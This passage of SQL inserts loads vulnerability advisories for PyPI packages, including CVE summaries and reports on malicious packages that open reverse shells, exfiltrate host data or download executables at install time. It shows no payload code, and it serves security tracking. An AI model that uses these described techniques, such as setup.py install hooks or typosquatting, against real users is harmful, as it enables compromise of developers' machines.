Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: GENERIC-standard-pypi-install-pentest


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The package overrides the install command in setup.py to execute malicious code during installation.
', '["1.1.0", "0.0.0"]'::jsonb, '0.0', '2025-12-09 06:49:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-w4vg-rf63-f3j3', 'OSV', 'pillow', 'pypi', 'Arbitrary code using "crafted image file" approach affecting Pillow', 'Pillow before 3.3.2 allows context-dependent attackers to execute arbitrary code by using the "crafted image file" approach, related to an "Insecure Sign Extension" issue affecting the ImagingNew in Storage.c component.', '["1.0", "1.1", "1.2", "1.3", "1.4", "1.5", "1.6", "1.7.0", "1.7.1", "1.7.2", "1.7.3", "1.7.4", "1.7.5", "1.7.6", "1.7.7", "1.7.8", "2.0.0", "2.1.0", "2.2.0", "2.2.1", "2.2.2", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.8.2", "2.9.0", "3.0.0", "3.1.0", "3.1.0.rc1", "3.1.0rc1", "3.1.1", "3.1.2", "3.2.0", "3.3.0", "3.3.1"]'::jsonb, '0.0', '2018-07-12 14:45:42+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2017-26', 'OSV', 'pysaml2', 'pypi', '', 'Python package pysaml2 version 4.4.0 and earlier reuses the initialization vector across encryptions in the IDP server, resulting in weak encryption of data.', '["0.4.3", "1.0.1", "1.0.2", "1.0.3", "1.1.0", "2.0.0", "2.1.0", "2.2.0", "2.3.0", "2.4.0", "3.0.0", "3.0.2", "4.0.0", "4.0.1", "4.0.2", "4.0.3", "4.0.4", "4.0.5", "4.0.5rc1", "4.1.0", "4.2.0", "4.3.0", "4.4.0", "4.5.0"]'::jsonb, '0.0', '2017-11-17 04:29:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5117', 'OSV', 'ethertoollerz', 'pypi', 'Malicious code in ethertoollerz (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0"]'::jsonb, '0.0', '2024-06-25 13:35:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-wcm6-wv95-7jw6', 'OSV', 'pyload-ng', 'pypi', 'Cross-site Scripting in pyload-ng', 'Cross-site Scripting (XSS) - Stored in GitHub repository pyload/pyload prior to 0.5.0b3.dev42.', '["0.5.0a5.dev528", "0.5.0a5.dev532", "0.5.0a5.dev535", "0.5.0a5.dev536", "0.5.0a5.dev537", "0.5.0a5.dev539", "0.5.0a5.dev540", "0.5.0a5.dev545", "0.5.0a5.dev562", "0.5.0a5.dev564", "0.5.0a5.dev565", "0.5.0a6.dev570", "0.5.0a6.dev578", "0.5.0a6.dev587", "0.5.0a7.dev596", "0.5.0a8.dev602", "0.5.0a9.dev615", "0.5.0a9.dev629", "0.5.0a9.dev632", "0.5.0a9.dev641", "0.5.0a9.dev643", "0.5.0a9.dev655", "0.5.0a9.dev806", "0.5.0b1.dev1", "0.5.0b1.dev2", "0.5.0b1.dev3", "0.5.0b1.dev4", "0.5.0b1.dev5", "0.5.0b2.dev10", "0.5.0b2.dev11", "0.5.0b2.dev12", "0.5.0b2.dev9", "0.5.0b3.dev13", "0.5.0b3.dev14", "0.5.0b3.dev17", "0.5.0b3.dev18", "0.5.0b3.dev19", "0.5.0b3.dev20", "0.5.0b3.dev21", "0.5.0b3.dev22", "0.5.0b3.dev24", "0.5.0b3.dev26", "0.5.0b3.dev27", "0.5.0b3.dev28", "0.5.0b3.dev29", "0.5.0b3.dev30", "0.5.0b3.dev31", "0.5.0b3.dev32", "0.5.0b3.dev33", "0.5.0b3.dev34", "0.5.0b3.dev35", "0.5.0b3.dev38", "0.5.0b3.dev39", "0.5.0b3.dev40", "0.5.0b3.dev41"]'::jsonb, '0.0', '2023-01-27 00:30:18+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-98', 'OSV', 'apache-submarine', 'pypi', '', '** UNSUPPORTED WHEN ASSIGNED ** Incorrect Authorization vulnerability in Apache Submarine Server Core.

This issue affects Apache Submarine Server Core: from 0.8.0.

As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.

NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

', '["0.8.0"]'::jsonb, '0.0', '2024-06-12 15:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-299', 'OSV', 'tensorflow', 'pypi', '', 'TensorFlow is an end-to-end open source platform for machine learning. In affected versions the shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments. The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values. We have patched the issue in GitHub commit da857cfa0fde8f79ad0afdbc94e88b5d4bbec764. The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.', '["2.3.0", "2.3.1", "2.3.2", "2.3.3", "2.4.0", "2.4.1", "2.4.2"]'::jsonb, '0.0', '2021-08-12 23:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-881', 'OSV', 'eftl', 'pypi', '', 'The FTL Server (tibftlserver) and Docker images containing tibftlserver components of TIBCO Software Inc.''s TIBCO ActiveSpaces - Community Edition, TIBCO ActiveSpaces - Developer Edition, TIBCO ActiveSpaces - Enterprise Edition, TIBCO FTL - Community Edition, TIBCO FTL - Developer Edition, TIBCO FTL - Enterprise Edition, TIBCO eFTL - Community Edition, TIBCO eFTL - Developer Edition, and TIBCO eFTL - Enterprise Edition contain a vulnerability that theoretically allows a non-administrative, authenticated FTL user to trick the affected components into creating illegitimate certificates. These maliciously generated certificates can be used to enable man-in-the-middle attacks or to escalate privileges so that the malicious user has administrative privileges. Affected releases are TIBCO Software Inc.''s TIBCO ActiveSpaces - Community Edition: versions 4.3.0, 4.4.0, 4.5.0, 4.6.0, 4.6.1, and 4.6.2, TIBCO ActiveSpaces - Developer Edition: versions 4.3.0, 4.4.0, 4.5.0, 4.6.0, 4.6.1, and 4.6.2, TIBCO ActiveSpaces - Enterprise Edition: versions 4.3.0, 4.4.0, 4.5.0, 4.6.0, 4.6.1, and 4.6.2, TIBCO FTL - Community Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0, TIBCO FTL - Developer Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0, TIBCO FTL - Enterprise Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0, TIBCO eFTL - Community Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0, TIBCO eFTL - Developer Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0, and TIBCO eFTL - Enterprise Edition: versions 6.2.0, 6.3.0, 6.3.1, 6.4.0, 6.5.0, 6.6.0, 6.6.1, and 6.7.0.', '["1.0.0", "1.1.0", "1.2.0", "1.3.0", "1.3.1"]'::jsonb, '0.0', '2021-10-05 18:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-44', 'OSV', 'products-pluggableauthservice', 'pypi', '', 'Products.PluggableAuthService is a pluggable Zope authentication and authorization framework. In Products.PluggableAuthService before version 2.6.0 there is an information disclosure vulnerability - everyone can list the names of roles defined in the ZODB Role Manager plugin if the site uses this plugin. The problem has been fixed in version 2.6.0. Depending on how you have installed Products.PluggableAuthService, you should change the buildout version pin to 2.6.0 and re-run the buildout, or if you used pip simply do `pip install "Products.PluggableAuthService>=2.6.0"`.', '["1.5.2", "1.5.2.1", "1.5.3", "1.5.4", "1.5.5", "1.6", "1.6.1", "1.6.2", "1.6.3", "1.6.4", "1.6.5", "1.7.0b1", "1.7.0b2", "1.7.0", "1.7.1", "1.7.2", "1.7.3", "1.7.4", "1.7.5", "1.7.6", "1.7.7", "1.7.8", "1.8.0", "1.9.0", "1.10.0", "1.11.0", "1.11.1", "1.11.2", "1.11.3", "2.0b1", "2.0b2", "2.0b3", "2.0b4", "2.0b5", "2.0b6", "2.0", "2.1", "2.1.1", "2.2", "2.2.1", "2.3", "2.4", "2.5", "2.5.1"]'::jsonb, '0.0', '2021-03-08 21:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5290', 'OSV', 'kazer12', 'pypi', 'Malicious code in kazer12 (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1", "2"]'::jsonb, '0.0', '2024-06-25 13:36:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-490', 'OSV', 'tensorflow-cpu', 'pypi', '', 'TensorFlow is an end-to-end open source platform for machine learning. An attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.', '["1.15.0", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.4.1"]'::jsonb, '0.0', '2021-05-14 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-m35w-xx8c-6xc7', 'OSV', 'doris-mcp-server', 'pypi', 'Apache Doris-MCP-Server: Improper Access Control results in bypassing a "read-only" mode', 'An attacker with a valid read-only account can bypass Doris MCP Server’s read-only mode due to improper access control, allowing modifications that should have been prevented by read-only restrictions.

Impact:

Bypasses read-only mode; attackers with read-only access may perform unauthorized modifications.

Recommended action for operators: Upgrade to version 0.6.0 as soon as possible (this release contains the fix).', '["0.4.2", "0.5.0", "0.5.1"]'::jsonb, '0.0', '2025-11-05 12:30:19+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-4749', 'OSV', 'aietelegram', 'pypi', 'Malicious code in aietelegram (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["0.3"]'::jsonb, '0.0', '2024-06-25 13:32:16+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-222', 'OSV', 'onnx', 'pypi', '', 'Versions of the package onnx before and including 1.15.0 are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory. The vulnerability occurs as a bypass for the patch added for CVE-2022-25882.
', '["0.1", "0.2", "0.2.1", "1.0.0", "1.0.1", "1.1.0", "1.1.1", "1.1.2", "1.10.0", "1.10.1", "1.10.2", "1.11.0", "1.12.0", "1.13.0", "1.13.1", "1.14.0", "1.14.1", "1.15.0", "1.2.1", "1.2.2", "1.2.3", "1.3.0", "1.4.0", "1.4.1", "1.5.0", "1.6.0", "1.7.0", "1.8.0", "1.8.1", "1.9.0", "v1.3.0", "v1.1.0", "v0.2", "v0.1"]'::jsonb, '0.0', '2024-02-23 18:15:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-w7cp-g8v7-r54m', 'OSV', 'apache-airflow', 'pypi', 'Apache Airflow Cross-site Scripting Vulnerability', 'Apache Airflow, versions before 2.10.0, have a vulnerability that allows the developer of a malicious provider to execute a cross-site scripting attack when clicking on a provider documentation link. This would require the provider to be installed on the web server and the user to click the provider link.
Users should upgrade to 2.10.0 or later, which fixes this vulnerability.', '["1.10.0", "1.10.1", "1.10.10", "1.10.10rc1", "1.10.10rc2", "1.10.10rc3", "1.10.10rc4", "1.10.10rc5", "1.10.11", "1.10.11rc1", "1.10.11rc2", "1.10.12", "1.10.12rc1", "1.10.12rc2", "1.10.12rc3", "1.10.12rc4", "1.10.13", "1.10.13rc1", "1.10.14", "1.10.14rc1", "1.10.14rc2", "1.10.14rc3", "1.10.14rc4", "1.10.15", "1.10.15rc1", "1.10.1b1", "1.10.1rc2", "1.10.2", "1.10.2b2", "1.10.2rc1", "1.10.2rc2", "1.10.2rc3", "1.10.3", "1.10.3b1", "1.10.3b2", "1.10.3rc1", "1.10.3rc2", "1.10.4", "1.10.4b2", "1.10.4rc1", "1.10.4rc2", "1.10.4rc3", "1.10.4rc4", "1.10.4rc5", "1.10.5", "1.10.5rc1", "1.10.6", "1.10.6rc1", "1.10.6rc2", "1.10.7", "1.10.7rc1", "1.10.7rc2", "1.10.7rc3", "1.10.8", "1.10.8rc1", "1.10.9", "1.10.9rc1", "1.8.1", "1.8.2", "1.8.2rc1", "1.9.0", "2.0.0", "2.0.0b1", "2.0.0b2", "2.0.0b3", "2.0.0rc1", "2.0.0rc2", "2.0.0rc3", "2.0.1", "2.0.1rc1", "2.0.1rc2", "2.0.2", "2.0.2rc1", "2.1.0", "2.1.0rc1", "2.1.0rc2", "2.1.1", "2.1.1rc1", "2.1.2", "2.1.2rc1", "2.1.3", "2.1.3rc1", "2.1.4", "2.1.4rc1", "2.1.4rc2", "2.10.0b1", "2.10.0b2", "2.10.0rc1", "2.2.0", "2.2.0b1", "2.2.0b2", "2.2.0rc1", "2.2.1", "2.2.1rc1", "2.2.1rc2", "2.2.2", "2.2.2rc1", "2.2.2rc2", "2.2.3", "2.2.3rc1", "2.2.3rc2", "2.2.4", "2.2.4rc1", "2.2.5", "2.2.5rc1", "2.2.5rc2", "2.2.5rc3", "2.3.0", "2.3.0b1", "2.3.0rc1", "2.3.0rc2", "2.3.1", "2.3.1rc1", "2.3.2", "2.3.2rc1", "2.3.2rc2", "2.3.3", "2.3.3rc1", "2.3.3rc2", "2.3.3rc3", "2.3.4", "2.3.4rc1", "2.4.0", "2.4.0b1", "2.4.0rc1", "2.4.1", "2.4.1rc1", "2.4.2", "2.4.2rc1", "2.4.3", "2.4.3rc1", "2.5.0", "2.5.0rc1", "2.5.0rc2", "2.5.0rc3", "2.5.1", "2.5.1rc1", "2.5.1rc2", "2.5.2", "2.5.2rc1", "2.5.2rc2", "2.5.3", "2.5.3rc1", "2.5.3rc2", "2.6.0", "2.6.0b1", "2.6.0rc1", "2.6.0rc2", "2.6.0rc3", "2.6.0rc4", "2.6.0rc5", "2.6.1", "2.6.1rc1", "2.6.1rc2", "2.6.1rc3", "2.6.2", "2.6.2rc1", "2.6.2rc2", "2.6.3", "2.6.3rc1", "2.7.0", "2.7.0b1", "2.7.0rc1", "2.7.0rc2", "2.7.1", "2.7.1rc1", "2.7.1rc2", "2.7.2", "2.7.2rc1", "2.7.3", "2.7.3rc1", "2.8.0", "2.8.0b1", "2.8.0rc1", "2.8.0rc2", "2.8.0rc3", "2.8.0rc4", "2.8.1", "2.8.1rc1", "2.8.2", "2.8.2rc1", "2.8.2rc2", "2.8.2rc3", "2.8.3", "2.8.3rc1", "2.8.4", "2.8.4rc1", "2.9.0", "2.9.0b1", "2.9.0b2", "2.9.0rc1", "2.9.0rc2", "2.9.0rc3", "2.9.1", "2.9.1rc1", "2.9.1rc2", "2.9.2", "2.9.2rc1", "2.9.3", "2.9.3rc1"]'::jsonb, '0.0', '2024-08-21 18:31:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-1977', 'OSV', 'hellohackers', 'pypi', 'Malicious code in hellohackers (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (63788f1f3223270be7955b619eb09fa7e7f401084e4332ed732d33b522782a37)
File contains a metapreter beacon that runs in the setup.py. Analysed version uses a local IP as the target.


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2025-02-hellohackers


Reasons (based on the campaign):


 - The package contains code to create a reverse shell, allowing an attacker to execute any commands on the victim''s machine.
', '["0.0.0"]'::jsonb, '0.0', '2025-02-05 13:44:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-10424', 'OSV', 'bytedplus', 'pypi', 'Malicious code in bytedplus (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (d0834f67446cfb4cafacef18c27e77ffb32db628ed1d6b2f64f811248b44dba6)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion

## Source: ossf-package-analysis (98e0aa923fb61006253e556b8e886afe6a95dfd02d3ef99a271b7068f735c4a4)
The OpenSSF Package Analysis project identified ''bytedplus'' @ 99.7 (pypi) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["99.7"]'::jsonb, '0.0', '2024-11-06 11:07:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5551', 'OSV', 'plasticswampbubble', 'pypi', 'Malicious code in plasticswampbubble (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.0"]'::jsonb, '0.0', '2024-06-25 13:38:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-928', 'OSV', 'polyutil', 'pypi', 'Malicious code in polyutil (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (31a0fc68eee0841a78740fd3e3748171612b871b58bf9f3e52b4fa35bed64774)
The package is prepared to download a hardcoded executable and save it in %LOCALAPPDATA% under a very generic name, clearly aiming to hide its existence. Code is also prepared to alter MarkOfTheWeb, start as admin and run the executable, but in analyzed versions this behavior was not triggered in any existing code path. The downloading will happen e.g. on starting the declared command line.

Remote executables are standalone applications or installators, including ClickOnce installators. However, in the analysis attempts, none of them showed clear malicious behavior, in most cases crashing during the analysis. Captured network traffic shows communication with the remote server and likely expects the URL of the next stage, which was not delivered from the server. Additionally, the code embeds a separate path for execution on non-Windows machines. It attempts to execute a remote script, but in analyzed versions, the domain used is already suspended and not reachable. 

In newer packages the remote code is another downloader, which then downloads a PyInstaller-packed executable that just calls back home but has no more functionality.


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2026-02-magichat


Reasons (based on the campaign):


 - Downloads and executes a remote executable.


 - other


 - typosquatting
', '["1.0.0"]'::jsonb, '0.0', '2026-02-17 04:31:14+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-cvpc-8phh-8f45', 'OSV', 'tensorflow', 'pypi', 'Out of bounds access in tensorflow-lite', '### Impact
In TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/kernel_util.cc#L36

However, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/c/common.h#L82

This results in special casing during validation at model loading time: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/core/subgraph.cc#L566-L580

Unfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don''t expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.

This results in both read and write gadgets, albeit very limited in scope.

### Patches
We have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### Workarounds
A potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.', '["2.3.0"]'::jsonb, '0.0', '2020-09-25 18:28:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-306', 'OSV', 'pywasm3', 'pypi', '', 'wasm3 139076a contains a Use-After-Free in ForEachModule.', '["0.0.1", "0.0.2", "0.4.8", "0.4.9", "0.5.0"]'::jsonb, '0.0', '2024-11-08 22:15:15.52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-7p94-766c-hgjp', 'OSV', 'nltk', 'pypi', 'NLTK has a Zip Slip Vulnerability', 'A critical vulnerability exists in the NLTK downloader component of nltk/nltk, affecting all versions. The _unzip_iter function in nltk/downloader.py uses zipfile.extractall() without performing path validation or security checks. This allows attackers to craft malicious zip packages that, when downloaded and extracted by NLTK, can execute arbitrary code. The vulnerability arises because NLTK assumes all downloaded packages are trusted and extracts them without validation. If a malicious package contains Python files, such as __init__.py, these files are executed automatically upon import, leading to remote code execution. This issue can result in full system compromise, including file system access, network access, and potential persistence mechanisms.', '["0.8", "0.9", "0.9.3", "0.9.4", "0.9.5", "0.9.6", "0.9.7", "0.9.8", "0.9.9", "2.0.1", "2.0.1rc1", "2.0.1rc2-git", "2.0.1rc3", "2.0.1rc4", "2.0.2", "2.0.3", "2.0.4", "2.0.5", "2.0b4", "2.0b5", "2.0b6", "2.0b7", "2.0b8", "2.0b9", "3.0.0", "3.0.0b1", "3.0.0b2", "3.0.1", "3.0.2", "3.0.3", "3.0.4", "3.0.5", "3.1", "3.2", "3.2.1", "3.2.2", "3.2.3", "3.2.4", "3.2.5", "3.3", "3.4", "3.4.1", "3.4.2", "3.4.3", "3.4.4", "3.4.5", "3.5", "3.5b1", "3.6", "3.6.1", "3.6.2", "3.6.3", "3.6.4", "3.6.5", "3.6.6", "3.6.7", "3.7", "3.8", "3.8.1", "3.9", "3.9.1", "3.9.2", "3.9b1"]'::jsonb, '0.0', '2026-02-18 18:30:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11543', 'OSV', 'bytebs', 'pypi', 'Malicious code in bytebs (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (443278bc9421868cfa1431a267241ecb62582b57285a1d5f093d7109e2d12288)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion
', '["912.6"]'::jsonb, '0.0', '2024-11-06 18:46:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2014-13', 'OSV', 'requests', 'pypi', '', 'Requests (aka python-requests) before 2.3.0 allows remote servers to obtain a netrc password by reading the Authorization header in a redirected request.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.2.0", "2.2.1"]'::jsonb, '0.0', '2014-10-15 14:55:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6433', 'OSV', 'anku2-rce', 'pypi', 'Malicious code in anku2-rce (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (4a0fdfa7bc3195d177e4d6e3dcad16eb59cc436e2b4dc48230b0c088546086fe)
Installing starts a reverse shell


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2025-07-anku2-rce


Reasons (based on the campaign):


 - The package contains code to create a reverse shell, allowing an attacker to execute any commands on the victim''s machine.


 - The package overrides the install command in setup.py to execute malicious code during installation.
', '["0.0.1", "0.0.2"]'::jsonb, '0.0', '2025-07-16 10:50:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-12289', 'OSV', 'hugchats', 'pypi', 'Malicious code in hugchats (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (172ccaf532e98b4ea6a98cdd9cb1cfb7b7f1b0efd593217f28d5a6b825edc1c1)
---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2024-07-adfboba


Reasons (based on the campaign):
', '["0.4.9"]'::jsonb, '0.0', '2024-07-09 18:52:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hrf3-622q-8366', 'OSV', 'nvflare', 'pypi', 'Unsafe yaml deserialization in NVFlare', '### Impact
NVFLARE contains a vulnerability in its utils module, where YAML files are loaded via yaml.load() instead of yaml.safe_load(). The deserialization of Untrusted Data, may allow an unprivileged network attacker to cause Remote Code Execution, Denial Of Service, and Impact to both Confidentiality and Integrity.

All versions before 2.1.2 are affected.
CVSS Score = 9.8
